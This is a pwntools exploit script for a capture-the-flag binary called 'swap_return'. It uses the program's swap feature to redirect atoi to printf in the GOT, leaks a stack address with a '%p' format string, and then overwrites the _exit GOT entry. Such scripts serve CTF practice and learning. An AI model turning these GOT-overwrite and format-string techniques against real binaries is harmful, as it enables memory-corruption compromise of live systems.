#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe  = context.binary = ELF('swap_return')
libc = ELF('/lib64/libc.so.6')
#libc = ELF('./swap_return_libc.so')

host = args.HOST or 'swap.chal.ctf.westerns.tokyo'
port = int(args.PORT or 37567)

#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./swap_return_libc.so")}

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x4008C2
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

prmpt = "choice:"
def swap():
    io.sendafter(prmpt, '2')

def set(addr1, addr2):
    io.sendafter(prmpt, '1')
    io.sendlineafter('address:', str(addr1))
    io.sendlineafter('address:', str(addr2))

def exit():
    io.sendafter(prmpt, '3')

def wrong():
    io.sendafter(prmpt, '4')

log.info("printf@got: " + str(exe.got['printf']) + " " + str(hex(exe.got['printf'])))
log.info("atoi@got: " + str(exe.got['atoi']) + " " + str(hex(exe.got['atoi'])))
log.info("__isoc99_fscanf@got: " + str(exe.got['__isoc99_fscanf']) + " " + str(hex(exe.got['__isoc99_fscanf'])))
log.info("puts@got: " + str(exe.got['puts']) + " " + str(hex(exe.got['puts'])))

wrong()
set(exe.got['atoi'], exe.got['printf'])
swap()
io.sendafter(prmpt, '%p')
io.recvline()
data = io.recvline()[:len("0x7ffe1eaa74661")]
print (data)

set(exe.got['_exit'], int(data, 16))
io.sendafter(prmpt, '22')
#io.sendafter(prmpt, '1')

io.interactive()
